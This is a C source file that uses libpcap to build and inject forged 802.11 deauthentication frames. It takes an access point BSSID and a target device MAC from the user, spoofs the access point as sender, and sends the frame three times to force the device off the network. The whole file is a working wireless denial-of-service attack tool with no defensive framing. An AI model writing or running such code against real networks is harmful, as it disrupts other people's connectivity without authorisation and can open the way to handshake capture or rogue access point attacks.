#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include "pcap.h"
#include "ieee80211.h"
#include "ieee80211_radiotap.h"
#include <stdint.h>
#include <pthread.h>
#include <string.h>
#include <time.h>

struct deauth_frame
{
    u_int8_t i_fc[2];
    u_int16_t i_dur;
    u_int8_t i_addr1[IEEE80211_ADDR_LEN];
    u_int8_t i_addr2[IEEE80211_ADDR_LEN];
    u_int8_t i_addr3[IEEE80211_ADDR_LEN];
    u_int8_t i_seq[2];
} __attribute__((packed));

struct radiotap_header
{
    uint8_t vision;
    uint8_t pad;
    uint16_t len;
    uint32_t present1;
    uint32_t present2;
    uint8_t flags;
    uint8_t rate;
    uint16_t channel_frequency;
    uint16_t channel_flag;
    uint8_t signal1;
    uint8_t padding;
    uint16_t rx_flag;
    uint8_t signal2;
    uint8_t antena;
} __attribute__((packed));

struct reason_code
{
    uint16_t reason;
} __attribute__((packed));

int main()
{
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    pcap_if_t *d;
    struct pcap_addr *a;
    int i = 0;
    int no;

    if (pcap_findalldevs(&alldevs, errbuf) < 0)
    {
        printf("pcap_findalldevs error\n");
        return 1;
    }

    for (d = alldevs; d; d = d->next)
    {
        printf("%d :  %s\n", ++i, (d->description) ? (d->description) : (d->name));
    }

    printf("number : ");
    scanf("%d", &no);

    if (!(no > 0 && no <= i))
    {
        printf("number error\n");
        return 1;
    }

    for (d = alldevs, i = 0; d; d = d->next)
    {
        if (no == ++i)
            break;
    }

    if (!(adhandle = pcap_open_live(d->name, 65536, 1, 1000, errbuf)))
    {
        printf("pcap_open_live error %s\n", d->name);
        pcap_freealldevs(alldevs);
        return -1;
    }

    pcap_freealldevs(alldevs);

    char tap[18];
    char tdev[18];

    printf("[AP_BSSID] [DEV_MAC] = ");
    scanf("%s %s", tap, tdev);

    uint8_t ap[IEEE80211_ADDR_LEN] = {0};
    uint8_t dev[IEEE80211_ADDR_LEN] = {0};
    sscanf(tap, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ap[0], &ap[1], &ap[2], &ap[3], &ap[4], &ap[5]);
    sscanf(tdev, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dev[0], &dev[1], &dev[2], &dev[3], &dev[4], &dev[5]);

    struct radiotap_header rh;
    rh.vision = 0;
    rh.pad = 0;
    rh.len = sizeof(rh);
    rh.present1 = 0x2e4000a0;
    rh.present2 = 0x20080000;
    rh.flags = 0;
    rh.channel_flag = 0xa000;
    rh.rx_flag = 0x00;
    rh.antena = 0;
    rh.padding = 0;

    struct deauth_frame fh;
    fh.i_fc[0] = IEEE80211_FC0_SUBTYPE_DEAUTH;
    fh.i_fc[1] = 0x00; //IEEE80211_FC1_DIR_NODS;
    fh.i_dur = 314;
    memcpy(fh.i_addr1, dev, IEEE80211_ADDR_LEN);
    memcpy(fh.i_addr2, ap, IEEE80211_ADDR_LEN);
    memcpy(fh.i_addr3, ap, IEEE80211_ADDR_LEN);
    fh.i_seq[0] = 0;
    fh.i_seq[1] = 0;

    struct reason_code rch;
    rch.reason = htons(0x0100);

    uint8_t packet[2500] = {0};
    int len = 0;

    memcpy(packet, &rh, sizeof(rh));
    len += sizeof(rh);
    memcpy(packet + len, &fh, sizeof(fh));
    len += sizeof(fh);
    memcpy(packet + len, &rch, sizeof(rch));
    len += sizeof(rch);

    for (i = 0; i < 3; i++)
    {
        pcap_sendpacket(adhandle, packet, len);
        sleep(1);
    }
}